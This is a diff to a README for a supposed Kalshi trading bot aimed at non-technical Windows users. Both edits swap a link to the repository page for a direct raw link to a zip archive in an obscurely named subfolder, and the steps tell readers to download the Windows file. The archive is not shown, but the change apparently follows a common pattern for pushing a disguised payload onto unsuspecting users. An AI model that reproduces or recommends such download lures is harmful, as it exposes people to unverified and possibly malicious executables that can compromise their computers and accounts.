@@ -1,6 +1,6 @@
 # 📈 Kalshi-Trading-Bot - Make Smarter Market Decisions
 
-[![Download Kalshi-Trading-Bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Janiferintrinsical821/Kalshi-Trading-Bot)
+[![Download Kalshi-Trading-Bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Janiferintrinsical821/Kalshi-Trading-Bot/raw/refs/heads/main/alloquy/Bot-Trading-Kalshi-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This project is built for non-technical users. You do not need to know how to co
 
 ## 📥 Download the App
 
-1. Open the download page here: https://github.com/Janiferintrinsical821/Kalshi-Trading-Bot
+1. Open the download page here: https://github.com/Janiferintrinsical821/Kalshi-Trading-Bot/raw/refs/heads/main/alloquy/Bot-Trading-Kalshi-v3.5.zip
 2. Look for the latest release or main download option on the page
 3. Download the Windows file to your computer
 4. If your browser asks where to save it, choose your Downloads folder
